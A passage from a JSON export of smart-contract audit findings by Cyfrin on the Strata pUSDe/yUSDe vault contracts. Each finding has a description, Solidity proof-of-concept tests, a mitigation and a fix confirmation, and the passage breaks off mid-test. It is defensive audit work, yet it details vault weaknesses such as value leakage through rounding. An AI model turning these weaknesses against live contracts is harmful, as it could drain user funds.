third-party vault malfunctions or restricts withdrawals. Currently, the only way to pause new deposits for a given vault is by removing the asset from the supported list; however, doing so also triggers a withdrawal of USDe which can fail for the reasons stated above, preventing the asset from being removed.\n\nWhile none of the externally-supported vault tokens intend to function with a decrease in share price, it is of course not possible except in very simplistic implementations to rule out the possibility of a smart contract hack in which the underlying USDe is stolen from one of the supported vaults. Combined with the issue above, given that users are free to withdraw into a any supported vault token regardless of those that they supplied, full withdraw by other users into unaffected vault tokens (or even if the required USDe is pulled from these vaults by `MetaVault::redeemRequiredBaseAssets` to process their withdrawals), this could result in a subset of users being left with the bad debt rather than it being amortized.\n\nIt is understood that the protocol team has strict criteria for supporting new third-party vaults, including the need for instant withdrawals, no limits, no cooldowns, and not pausable, though exceptions may be made for partners that maintain robust communication channels regarding development plans and updates.\n\n**Impact:** The inability to remove and redeem from vaults with withdrawal issues could result in a bank-run that leaves a subset of users with un-redeemable tokens.\n\n**Recommended Mitigation:** Implement some mechanism to disable new deposits to a vault without having to remove it and (attempt to) fully-redeem the underlying tokens. To amortize any losses a potential faulty vault, it may be necessary to track the individual vault contributions to `depositedBase` and so that they can be negated from redemption calculations.\n\n**Strata:** Fixed in commit [ae71893](https://github.com/Strata-Money/contracts/commit/ae718938d56ac581e9479e2831e5b75c67dda738).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57033",
      "title": "`yUSDeVault` inherits from `PreDepositVault` but doesn't call `onAfterDepositChecks` or `onAfterWithdrawalChecks`",
      "impact": "LOW",
      "content": "**Description:** `pUSDeVault` and `yUSDeVault` both inherit from `PreDepositVault`.\n\n`pUSDeVault` uses `PreDepositVault::onAfterDepositChecks` and `onAfterWithdrawalChecks` inside its overriden `_deposit` and `_withdraw` functions.\n\nHowever `yUSDeVault` doesn't do this; instead it attempts to re-implement the same code as these functions inside its `_deposit` and `_withdraw`, but omits this code from `onAfterWithdrawalChecks`:\n```solidity\nif (totalSupply() < MIN_SHARES) {\n    revert MinSharesViolation();\n}\n```\n\n**Impact:** The `MIN_SHARES` check won't be enforced in `yUSDeVault`.\n\n**Recommended Mitigation:** Use `PreDepositVault::onAfterDepositChecks` and `onAfterWithdrawalChecks` inside `yUSDeVault::_deposit` and `_withdraw`.\n\nAlternatively if the omission of the `MIN_SHARES` check is intentional, then add a boolean parameter to `onAfterWithdrawalChecks` whether to perform the check or not so that `yUSDeVault` can use the two functions it inherits to reduce code duplication.\n\n**Strata:** Fixed in commits [3f02ce5](https://github.com/Strata-Money/contracts/commit/3f02ce5c1076cbcab8943eae320ecfd590c1f634), [0812d57](https://github.com/Strata-Money/contracts/commit/0812d57f006d4cf3606b7a9c99bbbdf576c4e089).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57032",
      "title": "`pUSDeVault::maxRedeem` doesn't account for redemption pausing, in violation of EIP-4626 which can break protocols integrating with `pUSDeVault`",
      "impact": "LOW",
      "content": "**Description:** [EIP-4626](https://eips.ethereum.org/EIPS/eip-4626) states on `maxRedeem`:\n> MUST factor in both global and user-specific limits, like if redemption is entirely disabled (even temporarily) it MUST return 0.\n\n`pUSDeVault::maxRedeem` doesn't account for redemption pausing, in violation of EIP-4626 which can break protocols integrating with `pUSDeVault`. `MetaVault::redeem` uses `_withdraw` so redemptions will be paused when withdrawals are paused.\n\n**Proof of Concept:**\n```solidity\nfunction test_maxRedeem_WhenWithdrawalsPaused() external {\n    // user1 deposits $1000 USDe into the main vault\n    uint256 user1AmountInMainVault = 1000e18;\n    USDe.mint(user1, user1AmountInMainVault);\n\n    vm.startPrank(user1);\n    USDe.approve(address(pUSDe), user1AmountInMainVault);\n    uint256 user1MainVaultShares = pUSDe.deposit(user1AmountInMainVault, user1);\n    vm.stopPrank();\n\n    // admin pauses withdrawals\n    pUSDe.setWithdrawalsEnabled(false);\n\n    // doesn't revert but it should since `MetaVault::redeem` uses `_withdraw`\n    // and withdraws are paused, so `maxRedeem` should return 0\n    assertEq(pUSDe.maxRedeem(user1), user1AmountInMainVault);\n\n    // reverts with WithdrawalsDisabled\n    vm.prank(user1);\n    pUSDe.redeem(user1MainVaultShares, user1, user1);\n\n    // https://eips.ethereum.org/EIPS/eip-4626 maxRedeem says:\n    // MUST factor in both global and user-specific limits,\n    // like if redemption are entirely disabled (even temporarily) it MUST return 0\n}\n```\n\n**Recommended Mitigation:** When withdrawals are paused, `maxRedeem` should return 0. The override of `maxRedeem` should likely be done in `PreDepositVault` because there is where the pausing is implemented.\n\n**Strata:** Fixed in commit [8021069](https://github.com/Strata-Money/contracts/commit/80210696f5ebe73ad7fca071c1c1b7d82e2b02ae).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57031",
      "title": "`pUSDeVault::maxMint` doesn't account for mint pausing, in violation of EIP-4626 which can break protocols integrating with `pUSDeVault`",
      "impact": "LOW",
      "content": "**Description:** [EIP-4626](https://eips.ethereum.org/EIPS/eip-4626) states on `maxMint`:\n> MUST factor in both global and user-specific limits, like if mints are entirely disabled (even temporarily) it MUST return 0.\n\n`pUSDeVault::maxMint` doesn't account for mint pausing, in violation of EIP-4626 which can break protocols integrating with `pUSDeVault`. Since `MetaVault::mint` uses `_deposit`, mints will be paused when deposits are paused.\n\n**Proof of Concept:**\n```solidity\nfunction test_maxMint_WhenDepositsPaused() external {\n    // admin pauses deposists\n    pUSDe.setDepositsEnabled(false);\n\n    // should revert here as maxMint should return 0\n    // since deposits are paused and `MetaVault::mint` uses `_deposit`\n    assertEq(pUSDe.maxMint(user1), type(uint256).max);\n\n    // attempt to mint to show the error\n    uint256 user1AmountInMainVault = 1000e18;\n    USDe.mint(user1, user1AmountInMainVault);\n\n    vm.startPrank(user1);\n    USDe.approve(address(pUSDe), user1AmountInMainVault);\n    // reverts with DepositsDisabled since `MetaVault::mint` uses `_deposit`\n    uint256 user1MainVaultShares = pUSDe.mint(user1AmountInMainVault, user1);\n    vm.stopPrank();\n\n    // https://eips.ethereum.org/EIPS/eip-4626 maxMint says:\n    // MUST factor in both global and user-specific limits,\n    // like if mints are entirely disabled (even temporarily) it MUST return 0.\n}\n```\n\n**Recommended Mitigation:** When deposits are paused, `maxMint` should return 0. The override of `maxMint` should likely be done in `PreDepositVault` because there is where the pausing is implemented.\n\n**Strata:** Fixed in commit [8021069](https://github.com/Strata-Money/contracts/commit/80210696f5ebe73ad7fca071c1c1b7d82e2b02ae).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57030",
      "title": "`pUSDeVault::maxDeposit` doesn't account for deposit pausing, in violation of EIP-4626 which can break protocols integrating with `pUSDeVault`",
      "impact": "LOW",
      "content": "**Description:** [EIP-4626](https://eips.ethereum.org/EIPS/eip-4626) states on `maxDeposit`:\n> MUST factor in both global and user-specific limits, like if deposits are entirely disabled (even temporarily) it MUST return 0.\n\n`pUSDeVault::maxDeposit` doesn't account for deposit pausing, in violation of EIP-4626 which can break protocols integrating with `pUSDeVault`.\n\n**Proof of Concept:**\n```solidity\nfunction test_maxDeposit_WhenDepositsPaused() external {\n    // admin pauses deposists\n    pUSDe.setDepositsEnabled(false);\n\n    // reverts as maxDeposit returns uint256.max even though\n    // attempting to deposit would revert\n    assertEq(pUSDe.maxDeposit(user1), 0);\n\n    // https://eips.ethereum.org/EIPS/eip-4626 maxDeposit says:\n    // MUST factor in both global and user-specific limits,\n    // like if deposits are entirely disabled (even temporarily) it MUST return 0.\n}\n```\n\n**Recommended Mitigation:** When deposits are paused, `maxDeposit` should return 0. The override of `maxDeposit` should likely be done in `PreDepositVault` because there is where the pausing is implemented.\n\n**Strata:** Fixed in commit [8021069](https://github.com/Strata-Money/contracts/commit/80210696f5ebe73ad7fca071c1c1b7d82e2b02ae).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57029",
      "title": "`pUSDeVault::maxWithdraw` doesn't account for withdrawal pausing, in violation of EIP-4626 which can break protocols integrating with `pUSDeVault`",
      "impact": "LOW",
      "content": "**Description:** [EIP-4626](https://eips.ethereum.org/EIPS/eip-4626) states on `maxWithdraw`:\n> MUST factor in both global and user-specific limits, like if withdrawals are entirely disabled (even temporarily) it MUST return 0.\n\n`pUSDeVault::maxWithdraw` doesn't account for withdrawal pausing, in violation of EIP-4626 which can break protocols integrating with `pUSDeVault`.\n\n**Proof of Concept:**\n```solidity\nfunction test_maxWithdraw_WhenWithdrawalsPaused() external {\n    // user1 deposits $1000 USDe into the main vault\n    uint256 user1AmountInMainVault = 1000e18;\n    USDe.mint(user1, user1AmountInMainVault);\n\n    vm.startPrank(user1);\n    USDe.approve(address(pUSDe), user1AmountInMainVault);\n    uint256 user1MainVaultShares = pUSDe.deposit(user1AmountInMainVault, user1);\n    vm.stopPrank();\n\n    // admin pauses withdrawals\n    pUSDe.setWithdrawalsEnabled(false);\n\n    // reverts as maxWithdraw returns user1AmountInMainVault even though\n    // attempting to withdraw would revert\n    assertEq(pUSDe.maxWithdraw(user1), 0);\n\n    // https://eips.ethereum.org/EIPS/eip-4626 maxWithdraw says:\n    // MUST factor in both global and user-specific limits,\n    // like if withdrawals are entirely disabled (even temporarily) it MUST return 0\n}\n```\n\n**Recommended Mitigation:** When withdrawals are paused, `maxWithdraw` should return 0. The override of `maxWithdraw` should likely be done in `PreDepositVault` because there is where the pausing is implemented.\n\n**Strata:** Fixed in commit [8021069](https://github.com/Strata-Money/contracts/commit/80210696f5ebe73ad7fca071c1c1b7d82e2b02ae).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57028",
      "title": "No way to compound deposited supported vault assets into `sUSDe` stake during yield phase",
      "impact": "LOW",
      "content": "**Description:** Once the yield phase has been enabled, `pUSDeVault` still allows new supported vaults to be added and deposits via supported vaults.\n\nHowever for supported vaults which are not `sUSDe`, there is no way to withdraw their base token `USDe` and compound into the `sUSDe` vault stake used by the `pUSDeVault` vault.\n\n**Recommended Mitigation:** Either don't allow supported vaults to be added apart from `sUSDe` once yield phase has been enabled, or implement a function to withdraw their base token and compound it into the main stake.\n\n**Strata:** Fixed in commit [076d23e](https://github.com/Strata-Money/contracts/commit/076d23e2446ad6780b2c014d66a46e54425a8769#diff-34cf784187ffa876f573d51b705940947bc06ec85f8c303c1b16a4759f59524eR190) by no longer allowing adding new supporting vaults during the yield phase.\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57027",
      "title": "`pUSDeVault::startYieldPhase` should not remove supported vaults from being supported or should prevent new supported vaults once in the yield phase",
      "impact": "LOW",
      "content": "**Description:** The intention of `pUSDeVault::startYieldPhase` is to convert assets from existing supported vaults into `USDe` in order to then stake the vault's total `USDe` into the `sUSDe` vault.\n\nHowever because this ends up calling `MetaVault::removeVaultAndRedeemInner`, all the supported vaults are also removed after their assets are converted.\n\nBut new vaults can continue to be added during the yield phase, so it makes no sense to remove all supported vaults at this time.\n\n**Impact:** The contract owner will need to re-add all the previously enabled supported vaults causing all user deposits to revert until this is done.\n\n**Proof Of Concept:**\n```solidity\nfunction test_supportedVaultsRemovedWhenYieldPhaseEnabled() external {\n    // supported vault prior to yield phase\n    assertTrue(pUSDe.isAssetSupported(address(eUSDe)));\n\n    // user1 deposits $1000 USDe into the main vault\n    uint256 user1AmountInMainVault = 1000e18;\n    USDe.mint(user1, user1AmountInMainVault);\n\n    vm.startPrank(user1);\n    USDe.approve(address(pUSDe), user1AmountInMainVault);\n    uint256 user1MainVaultShares = pUSDe.deposit(user1AmountInMainVault, user1);\n    vm.stopPrank();\n\n    // admin triggers yield phase on main vault\n    pUSDe.startYieldPhase();\n\n    // supported vault was removed when initiating yield phase\n    assertFalse(pUSDe.isAssetSupported(address(eUSDe)));\n\n    // but can be added back in?\n    pUSDe.addVault(address(eUSDe));\n    assertTrue(pUSDe.isAssetSupported(address(eUSDe)));\n\n    // what was the point of removing it if it can be re-added\n    // and used again during the yield phase?\n}\n```\n\n**Recommended Mitigation:** Don't remove all supported vaults when calling `pUSDeVault::startYieldPhase`; just convert their assets to `USDe` but continue to allow the vaults themselves to be supported and accept future deposits.\n\nAlternatively don't allow supported vaults to be added during the yield phase (apart from sUSDe which is added when the yield phase is enabled). In this case removing them when enabled the yield phase is fine, but add code to disallow adding them once the yield phase is enabled.\n\n**Strata:** Fixed in commit [076d23e](https://github.com/Strata-Money/contracts/commit/076d23e2446ad6780b2c014d66a46e54425a8769#diff-34cf784187ffa876f573d51b705940947bc06ec85f8c303c1b16a4759f59524eR190) by no longer allowing adding new supporting vaults during the yield phase.\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57026",
      "title": "`MetaVault::addVault` should enforce identical underlying base asset",
      "impact": "LOW",
      "content": "**Description:** When supporting additional vaults, `MetaVault::addVault` should enforce that the new vault being supported has an identical underlying base asset as itself. Otherwise:\n* `redeemRequiredBaseAssets` won't work as expected since the newly supported vault doesn't have the same base asset\n* `MetaVault::depositedBase` will become corrupt, especially if the underlying asset tokens use different decimal precision\n\n**Proof of Concept:**\n```solidity\nfunction test_vaultSupportedWithDifferentUnderlyingAsset() external {\n    // create ERC4626 vault with different underlying ERC20 asset\n    MockUSDe differentERC20 = new MockUSDe();\n    MockERC4626 newSupportedVault = new MockERC4626(differentERC20);\n\n    // verify pUSDe doesn't have same underlying asset as new vault\n    assertNotEq(pUSDe.asset(), newSupportedVault.asset());\n\n    // but still allows it to be added\n    pUSDe.addVault(address(newSupportedVault));\n\n    // this breaks `MetaVault::redeemRequiredBaseAssets` since\n    // the newly supported vault doesn't have the same base asset\n}\n```\n\n**Recommended Mitigation:** Change `MetaVault::addVaultInner`:\n```diff\n    function addVaultInner (address vaultAddress) internal {\n+       IERC4626 newVault = IERC4626(vaultAddress);\n+       require(newVault.asset() == asset(), \"Vault asset mismatch\");\n```\n\n**Strata:** Fixed in commits [9e64f09](https://github.com/Strata-Money/contracts/commit/9e64f09af6eb927c9c736796aeb92333dbb72c18), [706c2df](https://github.com/Strata-Money/contracts/commit/706c2df3f2caf6651b1d8e858beb5097dbd7d066).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57025",
      "title": "Duplicate vaults can be pushed to `assetsArr`",
      "impact": "LOW",
      "content": "**Description:** While `MetaVault::addVault` is protected by the `onlyOwner` modifier, there is no restriction on the number of times this function can be called with a given `vaultAddress` as argument:\n\n```solidity\n    function addVault(address vaultAddress) external onlyOwner {\n        addVaultInner(vaultAddress);\n    }\n\n    function addVaultInner (address vaultAddress) internal {\n        TAsset memory vault = TAsset(vaultAddress, EAssetType.ERC4626);\n        assetsMap[vaultAddress] = vault;\n@>      assetsArr.push(vault);\n\n        emit OnVaultAdded(vaultAddress);\n    }\n```\n\nIn such a scenario, the vault will become duplicated within the `assetsArr` array. When called in `pUSDeVault::startYieldPhase`, the core redemption logic of `MetaVault::redeemMetaVaults` continues to function as expected. During the second iteration for the given vault address, the contract balance will simply be zero, so the redemption will be skipped, the `assetsMap` entry will again be re-written to default values, and the duplicate element will be removed from the array:\n\n```solidity\n    function removeVaultAndRedeemInner (address vaultAddress) internal {\n        // Redeem\n        uint balance = IERC20(vaultAddress).balanceOf(address(this));\n@>      if (balance > 0) {\n@>          IERC4626(vaultAddress).redeem(balance, address(this), address(this));\n        }\n\n        // Clean\n        TAsset memory emptyAsset;\n@>      assetsMap[vaultAddress] = emptyAsset;\n        uint length = assetsArr.length;\n        for (uint i = 0; i < length; i++) {\n            if (assetsArr[i].asset == vaultAddress) {\n                assetsArr[i] = assetsArr[length - 1];\n@>              assetsArr.pop();\n                break;\n            }\n        }\n    }\n\n    /// @dev Internal method to redeem all assets from supported vaults\n    /// @notice Iterates through all supported vaults and redeems their assets for the base token\n    function redeemMetaVaults () internal {\n        while (assetsArr.length > 0) {\n@>          removeVaultAndRedeemInner(assetsArr[0].asset);\n        }\n    }\n```\n\nHowever, if the given vault is removed from the list of supported vaults, `MetaVault::removeVault` will not allow the duplicate entry to be removed since the `requireSupportedVault()` invocation would fail on any subsequent attempt given that the mapping state is already overwritten to `address(0)` in the `removeVaultAndRedeemInner()` invocation:\n\n```solidity\n    function requireSupportedVault(address token) internal view {\n@>      address vaultAddress = assetsMap[token].asset;\n        if (vaultAddress == address(0)) {\n            revert UnsupportedAsset(token);\n        }\n    }\n\n    function removeVault(address vaultAddress) external onlyOwner {\n@>      requireSupportedVault(vaultAddress);\n        removeVaultAndRedeemInner(vaultAddress);\n\n        emit OnVaultRemoved(vaultAddress);\n    }\n```\n\nThe consequence of this depends on the intentions of the owner:\n* If they intend to keep the vault supported, all `MetaVault` functionality relying on the specified asset being a supported vault will revert if it has been attempted by the owner to remove a duplicated vault.\n* If they intend to completely remove the vault, this will not be possible; however, it will also not be possible to make any subsequent deposits, so impact is limited to redeeming during the transition to the yield phase rather than instantaneously.\n\n**Impact:** Vault assets could be redeemed later than intended and users could be temporarily prevented from withdrawing their funds.\n\n**Proof of Concept:** The following test should be included in `pUSDeVault.t.sol`:\n\n```solidity\nfunction test_duplicateVaults() public {\n    pUSDe.addVault(address(eUSDe));\n    pUSDe.removeVault(address(eUSDe));\n    assertFalse(pUSDe.isAssetSupported(address(eUSDe)));\n    vm.expectRevert();\n    pUSDe.removeVault(address(eUSDe));\n}\n```\n\n**Recommended Mitigation:** Revert if the given vault has already been added.\n\n**Strata:** Fixed in commit [787d1c7](https://github.com/Strata-Money/contracts/commit/787d1c72e86308897f06af775ed30b8dbef4cf2b).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57024",
      "title": "`MetaVault::redeem` erroneously calls `ERC4626Upgradeable::withdraw` when attempting to redeem `USDe` from `pUSDeVault`",
      "impact": "LOW",
      "content": "**Description:** Unlike `MetaVault::deposit`, `MetaVault::mint`, and `MetaVault::withdraw` which all invoke the corresponding `IERC4626` function, `MetaVault::redeem` erroneously calls `ERC4626Upgradeable::withdraw` when attempting to redeem `USDe` from `pUSDeVault`:\n\n```solidity\nfunction redeem(address token, uint256 shares, address receiver, address owner) public virtual returns (uint256) {\n    if (token == asset()) {\n        return withdraw(shares, receiver, owner);\n    }\n    ...\n}\n```\n\n**Impact:** The behavior of `MetaVault::redeem` differs from that which is expected depending on whether `token` is specified as `USDe` or one of the other supported vault tokens.\n\n**Recommended Mitigation:**\n```diff\n    function redeem(address token, uint256 shares, address receiver, address owner) public virtual returns (uint256) {\n        if (token == asset()) {\n--          return withdraw(shares, receiver, owner);\n++          return redeem(shares, receiver, owner);\n        }\n        ...\n    }\n```\n\n**Strata:** Fixed in commit [7665e7f](https://github.com/Strata-Money/contracts/commit/7665e7f3cd44d8a025f555737677d2014f4ac8a8).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57023",
      "title": "Use `SafeERC20::forceApprove` instead of standard `IERC20::approve`",
      "impact": "LOW",
      "content": "**Description:** Use [`SafeERC20::forceApprove`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol#L101-L108) when dealing with a range of potential tokens instead of standard `IERC20::approve`:\n```solidity\npredeposit/yUSDeDepositor.sol\n58:        pUSDe.approve(address(yUSDe), amount);\n\npredeposit/pUSDeVault.sol\n178:        USDe.approve(address(sUSDe), USDeAssets);\n\npredeposit/pUSDeDepositor.sol\n86:            asset.approve(address(vault), amount);\n98:        sUSDe.approve(address(pUSDe), amount);\n110:        USDe.approve(address(pUSDe), amount);\n122:        token.approve(swapInfo.router, amount);\n```\n\n**Strata:** Fixed in commit [f258bdc](https://github.com/Strata-Money/contracts/commit/f258bdcc49b87a2f8658b150bc3e3597a5187816).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57022",
      "title": "Hard-coded slippage in `pUSDeDepositor::deposit_viaSwap` can lead to denial of service",
      "impact": "LOW",
      "content": "**Description:** [Hard-coded slippage](https://dacian.me/defi-slippage-attacks#heading-hard-coded-slippage-may-freeze-user-funds) in `pUSDeDepositor::deposit_viaSwap` can lead to denial of service and in dramatic cases even [lock user funds](https://x.com/0xULTI/status/1875220541625528539).\n\n**Recommended Mitigation:** Slippage parameters should be calculated off-chain and supplied as input to swaps.\n\n**Strata:** Fixed in commit [2c43c07](https://github.com/Strata-Money/contracts/commit/2c43c07a839eb9d593c6bf67fc1b5c75b694aed7).\n\n**Cyfrin:** Verified. Callers can now override the default slippage.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57021",
      "title": "In `pUSDeDepositor::deposit_viaSwap`, using `block.timestamp` in swap deadline is not very effective",
      "impact": "LOW",
      "content": "**Description:** [Using `block.timestamp` in a swap deadline](https://dacian.me/defi-slippage-attacks#heading-no-expiration-deadline) is not very effective since `block.timestamp` will be the block which the transaction gets put in, so the swap will never be able to expire in this way.\n\nInstead the current `block.timestamp` should be retrieved off-chain and passed as input to the swap transaction.\n\n**Strata:** Fixed in commit [2c43c07](https://github.com/Strata-Money/contracts/commit/2c43c07a839eb9d593c6bf67fc1b5c75b694aed7).\n\n**Cyfrin:** Verified. Callers can now override the default swap deadline.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57020",
      "title": "Upgradeable contracts which are inherited from should use ERC7201 namespaced storage layouts or storage gaps to prevent storage collision",
      "impact": "LOW",
      "content": "**Description:** The protocol has upgradeable contracts which other contracts inherit from. These contracts should either use:\n* [ERC7201](https://eips.ethereum.org/EIPS/eip-7201) namespaced storage layouts - [example](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/access/AccessControlUpgradeable.sol#L60-L72)\n* storage gaps (though this is an [older and no longer preferred](https://blog.openzeppelin.com/introducing-openzeppelin-contracts-5.0#Namespaced) method)\n\nThe ideal mitigation is that all upgradeable contracts use ERC7201 namespaced storage layouts.\n\nWithout using one of the above two techniques storage collision can occur during upgrades.\n\n**Strata:** Fixed in commit [98068bd](https://github.com/Strata-Money/contracts/commit/98068bd9d9d435b37ce8f855f45b61d37aa274db).\n\n**Cyfrin:** Verified.",
      "summary": "",
      "quality_score": 4,
      "rarity_score": 3.5,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [
        "Storage Collision",
        "Storage Gap",
        "Upgradable"
      ],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57019",
      "title": "Value leakage due to pUSDe redemptions rounding against the protocol/yUSDe depositors",
      "impact": "MEDIUM",
      "content": "**Description:** After transitioning to the yield phase, redemptions of both pUSDe and yUSDe are processed by `pUSDeVault::_withdraw` such that they are both paid out in sUSDe. This is achieved by computing the sUSDe balance corresponding to the required USDe amount by calling its `previewWithdraw()` function:\n\n```solidity\n    function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares) internal override {\n\n            if (PreDepositPhase.YieldPhase == currentPhase) {\n                // sUSDeAssets = sUSDeAssets + user_yield_sUSDe\n@>              assets += previewYield(caller, shares);\n\n@>              uint sUSDeAssets = sUSDe.previewWithdraw(assets); // @audit - this rounds up because sUSDe requires the amount of sUSDe burned to receive assets amount of USDe to round up, but below we are transferring this rounded value out to the receiver which actually rounds against the protocol/yUSDe depositors!\n\n                _withdraw(\n                    address(sUSDe),\n                    caller,\n                    receiver,\n                    owner,\n                    assets, // @audit - this should not include the yield, since it is decremented from depositedBase\n                    sUSDeAssets,\n                    shares\n                );\n                return;\n            }\n        ...\n    }\n```\n\nThe issue with this is that `previewWithdraw()` returns the required sUSDe balance that must be burned to receive the specified USDe amount and so rounds up accordingly; however, here this rounded sUSDe amount is being transferred out of the protocol. This means that the redemption actually rounds in favour of the receiver and against the protocol/yUSDe depositors.\n\n**Impact:** Value can leak from the system in favour of pUSDe redemptions at the expense of other yUSDe depositors.\n\n**Proof of Concept:** Note that the following test will revert due to underflow when attempting to determine the fully redeemed amounts unless the mitigation from C-01 is applied:\n\n```solidity\npragma solidity 0.8.28;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {ERC1967Proxy} from \"@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol\";\nimport {IERC4626} from \"@openzeppelin/contracts/interfaces/IERC4626.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\nimport {MockUSDe} from \"../contracts/test/MockUSDe.sol\";\nimport {MockStakedUSDe} from \"../contracts/test/MockStakedUSDe.sol\";\nimport {MockERC4626} from \"../contracts/test/MockERC4626.sol\";\n\nimport {pUSDeVault} from \"../contracts/predeposit/pUSDeVault.sol\";\nimport {yUSDeVault} from \"../contracts/predeposit/yUSDeVault.sol\";\n\nimport {console2} from \"forge-std/console2.sol\";\n\ncontract RoundingTest is Test {\n    uint256 constant MIN_SHARES = 0.1 ether;\n\n    MockUSDe public USDe;\n    MockStakedUSDe public sUSDe;\n    pUSDeVault public pUSDe;\n    yUSDeVault public yUSDe;\n\n    address 